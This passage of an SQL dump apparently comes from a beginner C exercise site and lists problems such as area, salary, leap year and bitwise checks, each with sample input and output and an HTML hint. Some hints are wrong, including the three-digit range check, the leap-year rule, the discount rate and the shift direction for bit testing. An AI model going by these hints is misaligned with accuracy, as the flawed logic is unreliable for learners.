1;\">Sample Output 1:\r\n</p><p style=\"line-height: 1;\">10\r\n</p>','B','','prog/c/triangle.c','<p style=\"line-height: 1;\">Get height and width of a  triangle (using scanf statement)\r\n</p><p style=\"line-height: 1;\">\r\nCalculate area by dividing product of height and width by 2  (area = length * width/2)\r\n\r\nprint area (using printf statement)</p>',2,'','raptor/area_of_triangle_DtLlTKA.PNG',''),(85,'C Program to find area of Circle (Use Constant)','C-Program-to-find-area-of-Circle-Use-Constant','<p style=\"line-height: 1;\">Get radius of circle and find area of circle.\r\n</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">4\r\n</p><p style=\"line-height: 1;\">Sample Output 1:\r\n</p><p style=\"line-height: 1;\">50.24\r\n</p>','B','','prog/c/circle.c','<p style=\"line-height: 1;\">Get radius of a circle (using scanf statement)\r\n</p><p style=\"line-height: 1;\">\r\nCalculate area by  multiplying pi and radius and radius (area =pi*radius*radius)\r\n (pi is  3.14 , global constant)\r\n\r\nprint area (using printf statement)</p>',2,'','raptor/Area_of_circle_4MupyRo.PNG',''),(86,'C Program to find the distance between two points in 2D space','C-Program-to-find-the-distance-between-two-points-in-2D-space','<p style=\"line-height: 1;\">Get x and y coordinates of two points(x1,y1,x2,y2) and find distance between two points\r\n</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">3 4\r\n4 5\r\n</p><p style=\"line-height: 1;\">Sample Output 1:\r\n</p><p style=\"line-height: 1;\">1.414\r\n\r\n</p>','B','','prog/c/distance.c','<p style=\"line-height: 1;\">Get x1,y1,x2 and y2 coordinates of two points(using scanf statement)</p><p style=\"line-height: 1;\">\r\n\r\nCalculate distance by the eculdian distance formula. </p><p style=\"line-height: 1;\">Math.sqrt is function available in c library (in math.h header file)to find square root.\r\n</p><p style=\"line-height: 1;\">\r\nPrint distance (using printf statement).</p>',2,'','raptor/distance_in_2d_TQITh21.PNG',''),(87,'C Program to calculate Salary of Employee','C-Program-to-calculate-Salary-of-Employee','<p style=\"line-height: 1;\">Get employee wages and number of days worked from user and find Basic Pay, DA, HRA, PF and Net Pay.\r\n(Note HRA, DA and PF are 10%,5%and 12% of basicpay respectively.)\r\n</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">300 30\r\n</p><p style=\"line-height: 1;\">Sample Output 1:\r\n</p><p style=\"line-height: 1;\">Basic Pay:3000\r\nDA: 150\r\nHRA:300\r\nPF:360\r\nNet Pay: 3090\r\n</p>','B','','prog/c/salary.c','<p style=\"line-height: 1;\">Get daily wage of an employee and days worked by the employee. (using scanf statement).\r\n</p><p style=\"line-height: 1;\">\r\nCalculate Basic Pay by multiplying wages &amp; days worked</p><p style=\"line-height: 1;\">\r\n\r\nCalculate HRA by multplying basic pay and 0.1\r\n</p><p style=\"line-height: 1;\">\r\n\r\nCalculate DA by multplying basic pay and 0.05\r\n</p><p style=\"line-height: 1;\">\r\nCalculate PF by multiplying basic pay and 0.12</p><p style=\"line-height: 1;\">\r\n\r\nCalculate Net Pay by adding HRA and DA, subracting PF with Basic Pay.\r\n</p><p style=\"line-height: 1;\">\r\nPrint Basic Pay, DA, HRA, PF and Net Pay (using printf statement)\r\n\r\n\r\n</p>',2,'','raptor/employee_salary_cGnwpKU.PNG',''),(88,'C Program to convert  kilobytes to bytes','C-Program-to-convert-kilobytes-to-bytes','<p style=\"line-height: 1;\">Get kilobytes kb from user and find bytes b</p><p style=\"line-height: 1;\">\r\nSample Input 1:\r\n</p><p style=\"line-height: 1;\">2\r\n</p><p style=\"line-height: 1;\">Sample Output 1:\r\n</p><p style=\"line-height: 1;\">2048\r\n</p><p style=\"line-height: 1;\">Sample Input 2:\r\n</p><p style=\"line-height: 1;\">1\r\n</p><p style=\"line-height: 1;\">Sample Output 2:\r\n</p><p style=\"line-height: 1;\">1024\r\n</p>','B','','prog/c/kbtob.c','<p style=\"line-height: 1;\">Get kilobytes kb as input (using scanf statement) </p><p style=\"line-height: 1;\">\r\n\r\nCalculate bytes b by multipllying kilobytes kb with 1024. </p><p style=\"line-height: 1;\">(b=kb*1024, 1024 byts is equal to 1 kilobyte)\r\n</p><p style=\"line-height: 1;\">\r\nPrint bytes b (using printf statement)\r\n</p>',2,'','raptor/kilo_bytes_to_bytes_gUYYooi.PNG',''),(89,'C Program to convert bytes to kilobytes','C-Program-to-convert-bytes-to-kilobytes','<p style=\"line-height: 1;\">Get bytes b from user and  find kilobytes kb\r\n</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">2048\r\n</p><p style=\"line-height: 1;\">Sample Output 1:\r\n</p><p style=\"line-height: 1;\">2\r\n</p><p style=\"line-height: 1;\">Sample Input 2:\r\n</p><p style=\"line-height: 1;\">1024\r\n</p><p style=\"line-height: 1;\">Sample Output 2:\r\n</p><p style=\"line-height: 1;\">1\r\n</p>','B','','prog/c/btokb.c','<p style=\"line-height: 1;\">Get bytes b as input (using scanf statement) </p><p style=\"line-height: 1;\">\r\n\r\nCalculate kilobytes kb by dividing bytes b by 1024. </p><p style=\"line-height: 1;\">(kb=b/1024, 1024 byts is equal to 1 kilobyte)</p><p style=\"line-height: 1;\">\r\n\r\nPrint kilobytes kb (using printf statement)\r\n</p>',2,NULL,NULL,NULL),(90,'C Program to find simple interest','C-Program-to-find-simple-interest','<p style=\"line-height: 1;\">\r\nGet Principle amount, number of months, rate of interest from user and caluculate simple interest.\r\n</p><p style=\"line-height: 1;\">Sample Input 1:</p><p style=\"line-height: 1;\">\r\n5000\r\n12\r\n1.0\r\n</p><p style=\"line-height: 1;\">Sample Output 2:\r\n</p><p style=\"line-height: 1;\">600.00</p>','B','','prog/c/si.c','<p style=\"line-height: 1;\">Get principal p, number of months n and rate of intereset r as inputs.</p><p style=\"line-height: 1;\">(using scanf statement)\r\n\r\ncalculate Simple Intereset SI by formula SI= p*n*r/100</p><p style=\"line-height: 1;\">\r\n\r\nprint Simple Interest SI using printf statement.</p>',2,NULL,NULL,NULL),(91,'C Program to calculate Fahrenheit to Celsius','C-Program-to-calculate-Fahrenheit-to-Celsius','<p style=\"line-height: 1;\">Get Fahrenheit F from user and find celsius C\r\n</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">92.2\r\n</p><p style=\"line-height: 1;\">Sample Output 1:\r\n</p><p style=\"line-height: 1;\">33.44\r\n</p>','B','','prog/c/ftoc.c','<p style=\"line-height: 1;\">Get Fahrenheit f as input (using scanf statement)\r\n</p><p style=\"line-height: 1;\">\r\nCalculate Celsius c using Formula c=(f-32)*0.5556\r\n</p><p style=\"line-height: 1;\">\r\nprint Celcius c (using printf statement).</p>',2,NULL,NULL,NULL),(92,'C Program to calculate Celsius to Fahrenheit','C-Program-to-calculate-Celsius-to-Fahrenheit','<p style=\"line-height: 1;\">Get Celsius C from user and find Fahrenheit F\r\n</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">33.44\r\n</p><p style=\"line-height: 1;\">Sample Output 1:\r\n</p><p style=\"line-height: 1;\">92.20</p>','B','','prog/c/ctof.c','<p style=\"line-height: 1;\">Get celsius c as input (using scanf statement)\r\n</p><p style=\"line-height: 1;\">\r\nCalculate Fahrenheit f using Formula f=1.8*c+32\r\n</p><p style=\"line-height: 1;\">\r\nprint Fahrenheit f (using printf statement).</p>',2,NULL,NULL,NULL),(93,'C Program to Swap two numbers using third variable','C-Program-to-Swap-two-numbers-using-third-variable','<p style=\"line-height: 1;\">Get two integers a and b from user and swap the values\r\n</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">6 5\r\n</p><p style=\"line-height: 1;\">Sample Output 1:\r\n</p><p style=\"line-height: 1;\">5 6\r\n</p>','B','','prog/c/swap.c','<p style=\"line-height: 1;\">Get a and b using scanf statement\r\n\r\nswap the values using third variable t.\r\n</p><p style=\"line-height: 1;\">\r\nPrint a and b using printf statement</p>',2,NULL,NULL,NULL),(94,'C Program to Swap of two numbers without using third variable','C-Program-to-Swap-of-two-numbers-without-using-third-variable','<p style=\"line-height: 1;\">Get two integers a and b from user and swap the values without using third variable </p><p style=\"line-height: 1;\">\r\nSample Input 1:</p><p style=\"line-height: 1;\">\r\n6 5\r\n</p><p style=\"line-height: 1;\">Sample Output 1:</p><p style=\"line-height: 1;\">\r\n5 6\r\n</p>','B','','prog/c/swapt.c','<p style=\"line-height: 1;\">Get a and b using scanf statement\r\n\r\nswap the values without using any extra variables.\r\n</p><p style=\"line-height: 1;\">\r\nPrint a and b using printf statement</p>',2,NULL,NULL,NULL),(95,'C Program to print the last digit of given number N','C-Program-to-print-the-last-digit-of-given-number-N','<p style=\"line-height: 1;\">Get an number  n from user  and display the last digit of n\r\n</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">623\r\n</p><p style=\"line-height: 1;\">Sample Output 1:\r\n</p><p style=\"line-height: 1;\">3</p><p style=\"line-height: 1;\">Sample Input 2:</p><p style=\"line-height: 1;\">\r\n280\r\n</p><p style=\"line-height: 1;\">Sample Output 2:\r\n</p><p style=\"line-height: 1;\">0\r\n</p>','B','','prog/c/ldigit.c','<p style=\"line-height: 1;\">Get a number num (using scanf statement)\r\n\r\nSeprate the last digit of number num by \"digit = num%10\". </p><p style=\"line-height: 1;\">(% by 10 always gives last digit of a number)\r\n\r\nprint the digit (using printf statement)</p>',2,NULL,NULL,NULL),(96,'C Program to toggle a bit in number','C-Program-to-set-or-reset-a-bit-in-number','<p style=\"line-height: 1;\">Get a number n and bit b, n is a number and b denotes any bit postion of n. set b postion of n as 1 if it is 0, reset b postion of n as 0 if it is 1.\r\n</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">4 1\r\n</p><p style=\"line-height: 1;\">Sample Output 1:\r\n</p><p style=\"line-height: 1;\">5\r\nNote:\r\n4-&gt;0000 0100\r\nAfter seting 1st Pos: 0000 0101\r\nSo output is 5.</p>','B','','prog/c/bitset.c','Get a number num and bit as input  (using scanf statement)\r\n\r\nleft shift 1 by bit times (n=1<<bit)\r\n\r\nXOR n with num, num = num ^ n (it makes bit position as 0 if its is 1, else 1 if it is 0)\r\n\r\nprint the digit (using printf statement)',2,'','',''),(97,'C Program to initialize a variable to zero using XOR Operator','C-Program-to-initialize-a-variable-to-zero-using-XOR-Operator','<p style=\"line-height: 1;\">Get a integer n and make it as 0 using xor operator\r\n</p><p style=\"line-height: 1;\">\r\nSample Input 1:\r\n</p><p style=\"line-height: 1;\">\r\n6\r\n</p><p style=\"line-height: 1;\">\r\nSample Output 1:\r\n</p><p style=\"line-height: 1;\">\r\n0\r\n</p><p style=\"line-height: 1;\">\r\nSample Input 2:\r\n</p><p style=\"line-height: 1;\">\r\n28\r\n</p><p style=\"line-height: 1;\">\r\nSample Output 2:\r\n</p><p style=\"line-height: 1;\">\r\n0</p><p style=\"line-height: 1;\">\r\n</p>','B','','prog/c/reset.c','XOR any value with the same produces zero.',2,NULL,NULL,NULL),(98,'C Program to Compare M * pow(2,n) and M<<N','C-Program-to-Compare-M-pow2n-and-MN','<p style=\"line-height: 1;\">Get number n and m, left shit the bits of n for m times:\r\n</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">4 1\r\n</p><p style=\"line-height: 1;\">Sample Output 1:\r\n</p><p style=\"line-height: 1;\">8</p>','B','','prog/c/leftshift.c','left shift is equal to multiply a number with 2, left shift by n is equal to multiply with pow(2,n)',2,NULL,NULL,NULL),(99,'C Program to Compare M divided by pow(2,n) and M>>N','C-Program-to-Compare-M-divided-by-pow2n-and-MN','<p style=\"line-height: 1;\">Get number n and m, right shit the bits of n for m times:\r\n</p><p style=\"line-height: 1;\">\r\nSample Input 1:\r\n</p><p style=\"line-height: 1;\">\r\n4 1\r\n</p><p style=\"line-height: 1;\">\r\nSample Output 1:\r\n</p><p style=\"line-height: 1;\">\r\n2</p>','B','','prog/c/rightshift.c','right shift is equal to divide a number by 2,  right shift by n is equal to divide by pow(2,n)',2,NULL,NULL,NULL),(100,'C Program to calculate discount for purchase above 5000','C-Program-to-calculate-discount-for-purchase-above-5000','<p style=\"line-height: 1;\">Get price and quantity of a product, calculate bill amount and calculate 10% discount \r\nfor the bill amount 5000 and above.\r\n</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">10 400\r\n</p><p style=\"line-height: 1;\">Sample Output 1:</p><p style=\"line-height: 1;\">\r\n4000\r\n</p><p style=\"line-height: 1;\">Sample Input 2:\r\n</p><p style=\"line-height: 1;\">10 500\r\n</p><p style=\"line-height: 1;\">Sample Output 2:\r\n</p><p style=\"line-height: 1;\">4500</p>','B','','prog/c/discount.c','<p style=\"line-height: 1;\">Get two inputs quantity and price from user using <b>scanf</b> statement\r\n</p><p style=\"line-height: 1;\">\r\nCalculate amount by using the expression <b>amount = quantity * price</b>\r\n</p><p style=\"line-height: 1;\">\r\nCheck whether amount is greater than 5000 using <b>if</b> statement.\r\n</p><p style=\"line-height: 1;\">\r\nif amount is greater than 5000 then calculate discount and amount using the expressions <b>discount = amount * 0.05</b> and <b>amount = amount - discount</b>.\r\n</p><p style=\"line-height: 1;\">\r\nprint amount using <b>printf</b> statement.</p>',3,'','raptor/Branching.PNG',''),(101,'C Program to find greatest among two numbers','C-Program-to-find-greatest-among-two-numbers','<p style=\"line-height: 1;\">Get two numbers num1 and num2 and find the greatest one among num1 \r\nand num2.\r\n</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">5 6</p><p style=\"line-height: 1;\">Sample Ouput 1:</p><p style=\"line-height: 1;\">\r\n6</p>','B','','prog/c/greatest.c','<p style=\"line-height: 1;\">Get two inputs num1 and num2 from user using <b>scanf</b> statement</p><p style=\"line-height: 1;\">\r\n\r\ncheck whether num1 is greater than num2 using <b>if </b>statement.\r\n</p><p style=\"line-height: 1;\">\r\nif num1 is greater print num1 using <b>printf</b> statement, else check whether num2 is greater than num1 using <b>elseif</b> statement.\r\n</p><p style=\"line-height: 1;\">\r\nIf num2 is greater print num2 using printf statement, else print num1 and num2 are equal using <b>printf </b>statment.</p>',3,'','raptor/greatest_of_two_numbers_xwFaASo.PNG',''),(102,'C Program to find smallest among two numbers','C-Program-to-find-smallest-among-two-numbers','<p style=\"line-height: 1;\">Get two numbers num1 and num2 and find the smallest one among num1 \r\nand num2.\r\n</p><p style=\"line-height: 1;\">Sample Input 1:</p><p style=\"line-height: 1;\">\r\n5 6\r\n</p><p style=\"line-height: 1;\">Sample Output 1:\r\n</p><p style=\"line-height: 1;\">5\r\n</p>','B','','prog/c/smallest.c','<p style=\"line-height: 1;\">Get two inputs num1 and num2 from user using <b>scanf</b> statement\r\n</p><p style=\"line-height: 1;\">\r\ncheck whether num1 is smaller than num2 using <b>if </b>statement.\r\n</p><p style=\"line-height: 1;\">\r\nif num1 is smaller print num1 using <b>printf</b> statment, else check whether num2 is smaller than num1 using <b>elseif</b> statement.</p><p style=\"line-height: 1;\">\r\n\r\nIf num2 is smaller print num2 using printf statement, else print num1 and num2 are equal using <b>printf </b>statment.</p>',3,NULL,NULL,NULL),(103,'C Program to find whether the given number is odd or even number','C-Program-to-find-whether-the-given-number-is-odd-or-even-number','<p style=\"line-height: 1;\">Get a number num and check whether num is odd or even?</p><p style=\"line-height: 1;\">Sample Input 1:</p><p style=\"line-height: 1;\">45\r\n</p><p style=\"line-height: 1;\">Sample Output 1:\r\n</p><p style=\"line-height: 1;\">ODD</p><p style=\"line-height: 1;\">Sample Input 2:\r\n</p><p style=\"line-height: 1;\">56\r\n</p><p style=\"line-height: 1;\">Sample Output 2:\r\n</p><p style=\"line-height: 1;\">EVEN</p>','B','','prog/c/oddeven.c','<p style=\"line-height: 1;\">Get input num from user using scanf statement\r\n</p><p style=\"line-height: 1;\">\r\ncheck whether the remainder of num divided by 2 is equal to 0 using if statement.</p><p style=\"line-height: 1;\">\r\n\r\nif it is 0, then print num is even using printf statement.</p><p style=\"line-height: 1;\"> Else print num is odd using printf statement.\r\n</p>',3,'','raptor/odd_or_even_HGiJlnO.PNG',''),(104,'C Program to find whether the difference between two numbers is even or odd','C-Program-to-find-whether-the-difference-between-two-numbers-is-even-or-odd','<p style=\"line-height: 1;\">Get two numbers num1 and num2 and check whether the difference between num1 and num2 is odd or even? </p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">45 56</p><p style=\"line-height: 1;\">Sample Output 1:\r\n</p><p style=\"line-height: 1;\">ODD</p>','B','','prog/c/diffoddeven.c','<p style=\"line-height: 1;\">Get two inputs num1 and num2 from user using <b>scanf</b> statement\r\n</p><p style=\"line-height: 1;\">\r\nCalculate difference between num1 and num2 using the expression\r\n difference = num1 - num2.\r\n</p><p style=\"line-height: 1;\">\r\ncheck whether the remainder of difference divided by 2 is equal to 0 using if statement.\r\n</p><p style=\"line-height: 1;\">\r\nif it is 0, then print difference is even using printf statement. </p><p style=\"line-height: 1;\">Else print difference is odd using printf statement.</p>',3,NULL,NULL,NULL),(105,'C Program to find whether the given number is 3 digit number or not','C-Program-to-find-whether-the-given-number-is-3-digit-number-or-not','<p style=\"line-height: 1;\">Get a number num and check whether num is three digit number or not?.\r\n</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">1000\r\n</p><p style=\"line-height: 1;\">Sample Output 1:\r\n</p><p style=\"line-height: 1;\">Not a three digit number\r\n</p><p style=\"line-height: 1;\">Sample Input 2:\r\n</p><p style=\"line-height: 1;\">987\r\n</p><p style=\"line-height: 1;\">Sample Output 2:\r\n</p><p style=\"line-height: 1;\">Three digit number</p>','B','','prog/c/threedigit.c','<p style=\"line-height: 1;\">Get input num from user using scanf statement&nbsp; </p><p style=\"line-height: 1;\">check whether the num is greater than 99 and less than 100 using if statement.\r\n</p><p style=\"line-height: 1;\">\r\nif it is true, then print num is three digit number using printf statement. </p><p style=\"line-height: 1;\">Else print num is not three digit number using printf statement.\r\n</p>',3,'','raptor/3_digit_number_or_not_UARkarN.PNG',''),(106,'C Program to find greatest among three numbers','C-Program-to-find-greatest-among-three-numbers','<p style=\"line-height: 1;\">Get three numbers num1, num2 and num3 and find the greatest one among num1,num2 and num3.</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">5 6 2\r\n</p><p style=\"line-height: 1;\">Sample Output 1:\r\n</p><p style=\"line-height: 1;\">6</p>','B','','prog/c/greatestt.c','<p style=\"line-height: 1;\">Get three inputs num1, num2 and num3 from user using scanf statements.\r\n</p><p style=\"line-height: 1;\">\r\nCheck whether num1 is greater than num2 and num3 using if statement, if it is true print num1 is greatest using printf statement.\r\n</p><p style=\"line-height: 1;\">\r\nElse, num2 or num3 is greatest. </p><p style=\"line-height: 1;\">So check whether num2 is greater than num3 using elseif statement. </p><p style=\"line-height: 1;\">\r\n\r\nif num2 is greater, then print num2 is greater using printf statement. </p><p style=\"line-height: 1;\">Else, print num3 is greater using printf statement.\r\n</p>',3,NULL,NULL,NULL),(107,'C Program to find smallest among three numbers','C-Program-to-find-smallest-among-three-numbers','<p style=\"line-height: 1;\">Get three numbers num1, num2 and num3 and find the smallest one among num1,num2 and num3.</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">1 6 2</p><p style=\"line-height: 1;\">Sample Output 1:\r\n</p><p style=\"line-height: 1;\">1</p>','B','','prog/c/smallestt.c','<p style=\"line-height: 1;\">Get three inputs num1, num2 and num3 from user using scanf statements.</p><p style=\"line-height: 1;\">\r\n\r\nCheck whether num1 is smaller than num2 and num3 using if statement, if it is true print num1 is smallest using printf statement.\r\n</p><p style=\"line-height: 1;\">\r\nElse, num2 or num3 is smallest. </p><p style=\"line-height: 1;\">So check whether num2 is smaller than num3 using elseif statement. </p><p style=\"line-height: 1;\">\r\n\r\nif num2 is greater, then print num2 is smallest using printf statement. </p><p style=\"line-height: 1;\">Else, print num3 is smallest using printf statement.\r\n</p>',3,NULL,NULL,NULL),(108,'C Program to find whether the given number is divisible by 3','C-Program-to-find-whether-the-given-number-is-divisible-by-3','<p style=\"line-height: 1;\">Get a number num and check whether num is divisible by 3.</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">27\r\n</p><p style=\"line-height: 1;\">Sample Output 1:\r\n</p><p style=\"line-height: 1;\">Divisible by 3\r\n</p><p style=\"line-height: 1;\">Sample Input 2:\r\n</p><p style=\"line-height: 1;\">43</p><p style=\"line-height: 1;\">Sample Output 2:\r\n</p><p style=\"line-height: 1;\">Not divisible by 3</p>','B','','prog/c/divisibleby3.c','<p style=\"line-height: 1;\">Get input num from user using scanf statement\r\n</p><p style=\"line-height: 1;\">\r\ncheck whether the remainder of num divided by 3 is equal to 0 using if statement.\r\n</p><p style=\"line-height: 1;\">\r\nif it is 0, then print num is divisible by 3 using printf statement.</p><p style=\"line-height: 1;\"> Else print num is not divisible by 3 using printf statement.\r\n</p>',3,NULL,NULL,NULL),(109,'C Program to find whether the given year is leap year or not','C-Program-to-find-whether-the-given-year-is-leap-year-or-not','<p style=\"line-height: 1;\">Get a year and check whether year is leap year or not.\r\n</p><p style=\"line-height: 1;\">sample Input 1:\r\n</p><p style=\"line-height: 1;\">2016\r\n</p><p style=\"line-height: 1;\">Sample Output 1:</p><p style=\"line-height: 1;\">\r\nLeap year\r\n</p><p style=\"line-height: 1;\">Sample Input 2:\r\n</p><p style=\"line-height: 1;\">2017\r\n</p><p style=\"line-height: 1;\">Sample Output 2:</p><p style=\"line-height: 1;\">Not Leap Year</p>','B','','prog/c/leapyear.c','<p style=\"line-height: 1;\">Get input year from user using scanf statement\r\n</p><p style=\"line-height: 1;\">\r\ncheck whether the remainder of year divided by 4 is equal to 0 using if statement.\r\n</p><p style=\"line-height: 1;\">\r\nif it is 0, then print year is leap year using printf statement. </p><p style=\"line-height: 1;\">Else print year is not leap year using printf statement.\r\n</p>',3,NULL,NULL,NULL),(110,'C Program to find whether the last digit of given number is divisible by 3','C-Program-to-find-whether-the-last-digit-of-given-number-is-divisible-by-3','<p style=\"line-height: 1;\">Get a number num and check whether last digit of num is divisible by three.\r\n</p><p style=\"line-height: 1;\">Sample Input 1:</p><p style=\"line-height: 1;\">27\r\n</p><p style=\"line-height: 1;\">Sample Output 1:\r\n</p><p style=\"line-height: 1;\">last digit not Divisible by 3\r\n</p><p style=\"line-height: 1;\">Sample Input 2:\r\n</p><p style=\"line-height: 1;\">43</p><p style=\"line-height: 1;\">Sample Output 2:\r\n</p><p style=\"line-height: 1;\">last digit divisible by 3</p>','B','','prog/c/digitdivisibleby3.c','<p style=\"line-height: 1;\">Get input num from user using scanf statement\r\n\r\nextract last digit from num using the expression digit=num%10.</p><p style=\"line-height: 1;\">\r\n\r\ncheck whether the remainder of digit divided by 3 is equal to 0 using if statement.\r\n</p><p style=\"line-height: 1;\">\r\nif it is 0, then print tdig is divisible by 3 using printf statement. </p><p style=\"line-height: 1;\">Else print digit is not divisible by 3 using printf statement.</p><p style=\"line-height: 1;\">\r\n\r\n\r\n\r\nNote: any number modulus of 10 gives last digit of number.</p>',3,NULL,NULL,NULL),(111,'C Program to Arithmetic Calculator using switch case Statements','C-Program-to-Arithmetic-Calculator-using-switch-case-Statements','<p style=\"line-height: 1;\">Get a binary arithmetic expression and solve the expression.\r\n</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">12+9\r\n</p><p style=\"line-height: 1;\">Sample Output 1:</p><p style=\"line-height: 1;\">\r\n21\r\n</p><p style=\"line-height: 1;\">Sample Input 2:</p><p style=\"line-height: 1;\">\r\n4*5\r\n</p><p style=\"line-height: 1;\">Sample Output 2:\r\n</p><p style=\"line-height: 1;\">20\r\n</p>','B','','prog/c/calculator.c','Based on the second character operator, instructions in any one of the case will be executed.',3,NULL,NULL,NULL),(112,'C Program to grade calculation system','C-Program-to-grade-calculation-system','<p style=\"line-height: 1;\">Get a mark of a student and find its grade. (Note: 96 to 100 - O Grade&nbsp; 91 to 95 - A Grade 81 to 90-B Grade 71 to 80 - C Grade 61 to 70 - D Grade 50 to 60 - E Grade Below 50 - F Grade)</p><p style=\"line-height: 1;\">Sample Input 1:</p><p style=\"line-height: 1;\"> 75</p><p style=\"line-height: 1;\">Sample Output 2:</p><p style=\"line-height: 1;\"> C</p>','B','','prog/c/grade.c','chained conditional check is used here to check the mark range. any one of the grade will be displayed.',3,'','raptor/grade_inc_e0t8lh9.png',''),(113,'C Program to find the whether the last digit of given two numbers are equal or not','C-Program-to-find-the-whether-the-last-digit-of-given-two-numbers-are-equal-or-not','<p style=\"line-height: 1;\">Get two numbers num1 and num2 and check whether last digit of num1 and num2  are equal or not?.\r\n</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">65 45\r\n</p><p style=\"line-height: 1;\">Sample Output 1:\r\n</p><p style=\"line-height: 1;\">Equal&nbsp;</p><p style=\"line-height: 1;\">Sample Input 2:\r\n</p><p style=\"line-height: 1;\">35 38\r\n</p><p style=\"line-height: 1;\">sample Output 2:\r\n</p><p style=\"line-height: 1;\">Not Equal</p>','B','','prog/c/lastdigitequal.c','extract the last digits of num1 and num2 using %10, then compare last digits.',3,'','raptor/last_digit_equal_or_not_8zixF6u.PNG',''),(114,'C Program to calculate different discount for different Bill amount','C-Program-to-calculate-different-discount-for-different-Bill-amount','<p style=\"line-height: 1;\">Get price and quantity of a product, calculate bill amount, calculate 10% discount for the bill amount 5000 and above, 5% discount for the bill amount 1000 and above.\r\n</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">10 400\r\n</p><p style=\"line-height: 1;\">Sample Output 1:\r\n</p><p style=\"line-height: 1;\">3800\r\n</p><p style=\"line-height: 1;\">Sample Input 2:\r\n</p><p style=\"line-height: 1;\">10 500\r\n</p><p style=\"line-height: 1;\">Sample Output 2:</p><p style=\"line-height: 1;\">\r\n4500\r\n</p>','B','','prog/c/discountt.c','<p style=\"line-height: 1;\">chained conditional check is used here to check whether amount is greater than 1000 or greater than 5000. </p><p style=\"line-height: 1;\">any one of the expression to calculate discount will be executed.</p>',3,'','raptor/discount_wm0aRkZ.PNG',''),(115,'C Program to check whether ith bit in a number N is set or not','C-Program-to-check-whether-ith-bit-in-a-number-N-is-set-or-not','<p style=\"line-height: 1;\">Get a number n and bit I, check whether ith bit in num is set or not.\r\n</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">8 3</p><p style=\"line-height: 1;\">Sample Output 1:\r\n</p><p style=\"line-height: 1;\">Not Set\r\n</p><p style=\"line-height: 1;\">Sample Input 2:\r\n</p><p style=\"line-height: 1;\">8 1\r\n</p><p style=\"line-height: 1;\">Sample Output 2:\r\n</p><p style=\"line-height: 1;\">Set\r\nExplanation:\r\n</p><p style=\"line-height: 1;\">0000 1000</p>','B','','prog/c/bitsetcheck.c','<p style=\"line-height: 1;\">left shift the number num by n-1 times move the nth bit to LSB.\r\n</p><p style=\"line-height: 1;\">Do AND operation between num and 1, if the LSB is 1 then output is 1, if LSB is 0 then output is 0.</p>',3,NULL,NULL,NULL),(116,'C Program to check odd or even using bitwise operator','C-Program-to-check-odd-or-even-using-bitwise-operator','<p style=\"line-height: 1;\">Get a number num and check whether num is odd or even using bit wise operator.\r\n</p><p style=\"line-height: 1;\">Sample Input 1:</p><p style=\"line-height: 1;\">45\r\n</p><p style=\"line-height: 1;\">Sample Output 1:\r\n</p><p style=\"line-height: 1;\">ODD\r\n</p><p style=\"line-height: 1;\">Sample Input 2:\r\n</p><p style=\"line-height: 1;\">56\r\n</p><p style=\"line-height: 1;\">Sample Output 2:</p><p style=\"line-height: 1;\">\r\nEVEN</p>','B','','prog/c/bitoddeven.c','<p style=\"line-height: 1;\">last bit(LSB) is 0 for all even numbers and 1 for all odd numbers.\r\n</p><p style=\"line-height: 1;\">Example : 2 - 0000 0010, 8 - 0000 1000 and 5 - 0000 0101</p>',3,NULL,NULL,NULL),(741,'C Program to print N Natural numbers','C-Program-to-print-N-Natural-numbers','<p style=\"line-height: 1;\">Get input n and print natural numbers till n.\r\n</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">7\r\n</p><p style=\"line-height: 1;\">Sample Output 1:\r\n</p><p style=\"line-height: 1;\">1 2 3 4 5 6 7</p>','B','','prog/c/naturalnumber.c','<p style=\"line-height: 1;\">Instruction(s) inside the for block{} are executed repeatedly till  the second expression (i&lt;=n) is true.\r\n</p><p style=\"line-height: 1;\">\r\nHere i is initialized to 1 and incremented by 1 for each iteration, instructions inside the <b>for</b> block are executed unless i becomes greater than n. </p><p style=\"line-height: 1;\">so value of i will be printed like 1 2 3 .... n using printf statement.</p>',4,NULL,NULL,NULL),(742,'C Program to print Whole numbers till N','C-Program-to-print-Whole-numbers-till-N','<p style=\"line-height: 1;\">Get input n and print  whole numbers till n.\r\n</p><p style=\"line-height: 1;\">Sample Input 1:</p><p style=\"line-height: 1;\">7\r\n</p><p style=\"line-height: 1;\">Sample Output 1:</p><p style=\"line-height: 1;\">\r\n0 1 2 3 4 5 6 7</p>','B','','prog/c/wholenumber.c','<p style=\"line-height: 1;\">Instruction(s) inside the for block{} are executed repeatedly till  the second expression (i&lt;=n) is true.\r\n</p><p style=\"line-height: 1;\">\r\nHere i is initialized to 0 and incremented by 1 for each iteration, instructions inside the <b>for</b> block are executed unless i becomes greater than n.</p><p style=\"line-height: 1;\">  so value of i will be printed like 0 1 2 3 .... n using printf statement.</p>',4,NULL,NULL,NULL),(743,'C 